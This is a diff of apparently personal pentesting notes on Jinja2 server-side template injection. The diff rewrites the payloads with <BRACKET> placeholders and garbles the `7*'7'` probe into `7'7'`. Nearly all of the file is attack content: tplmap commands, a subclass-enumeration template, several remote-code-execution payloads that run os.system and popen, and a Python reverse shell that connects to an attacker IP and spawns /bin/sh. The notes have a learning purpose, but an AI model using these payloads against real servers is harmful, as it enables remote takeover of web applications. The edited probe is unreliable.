@@ -637,7 +637,7 @@ POST parameter: email
 
 ## Jinja2 
 
-After sending `7*'7'` and receaving `7777777` it means it's Jinja2.
+After sending `7'7'` and receaving `7777777` it means it's Jinja2.
 ```console
 zero@pio$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>/execute?cmd'
 
@@ -801,10 +801,10 @@ zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%20%27%27.__clas
 
 Let us print out the number and the method names using the following payload:
 ```python
-{% for i in range(450) %} 
-{{ i }}
-{{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
-{% endfor %}
+<BRACKET>% for i in range(450) %<BRACKET>
+<BRACKET><BRACKET> i <BRACKET><BRACKET>
+<BRACKET><BRACKET> ''.__class__.__mro__[1].__subclasses__()[i].__name__ <BRACKET><BRACKET>
+<BRACKET>% endfor %<BRACKET>
 ```
 
 ```console
@@ -817,7 +817,7 @@ zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%25%20for%20i%20in%
 
 As you can see in the application's response, `catch_warnings` is located at index `214`. We have everything we need to construct an RCE payload:
 ```python
-{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}
+<BRACKET><BRACKET>''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") <BRACKET><BRACKET>
 ```
 
 ```console
@@ -830,7 +830,7 @@ zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__
 
 This `0` means that the command got executed. We can identify if test1 was created using the following payload:
 ```python
-''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()
+<BRACKET><BRACKET>''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()<BRACKET><BRACKET>
 ```
 
 ```console
@@ -839,16 +839,16 @@ zero@pio$ curl -gs "http://<TARGET IP>:<PORT>/execute?cmd=%7B%7B%27%27.__class__
 
 We can also used `request` and `lipsum` to create the payload:
 ```python
-request.application.__globals__.__builtins__.__import__('os').popen('id').read()
+<BRACKET><BRACKET>request.application.__globals__.__builtins__.__import__('os').popen('id').read()<BRACKET><BRACKET>
 ```
 
 ```python
-lipsum.__globals__.os.popen('id').read()
+<BRACKET><BRACKET>lipsum.__globals__.os.popen('id').read()<BRACKET><BRACKET>
 ```
 
 Now let's create the payload:
 ```python
-''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<OUR IP>",<OUR PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()
+<BRACKET><BRACKET>''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<OUR IP>",<OUR PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()<BRACKET><BRACKET>
 ```
 
 > ALL THE PYTHON PAYLOADS ARE BETWEEN DOUBLE `{}`
